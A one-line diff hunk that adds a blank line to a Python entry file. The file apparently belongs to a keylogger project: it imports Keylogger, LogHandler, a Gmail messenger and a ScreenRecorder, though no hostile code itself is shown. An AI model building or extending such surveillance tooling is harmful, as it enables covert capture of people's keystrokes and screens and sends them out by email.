@@ -6,6 +6,7 @@ from .keylogger import Keylogger, LogHandler
 from .messenger import Gmail
 from .screen_recorder import ScreenRecorder
 
+
 if __name__ == "__main__":
     load_dotenv()
 
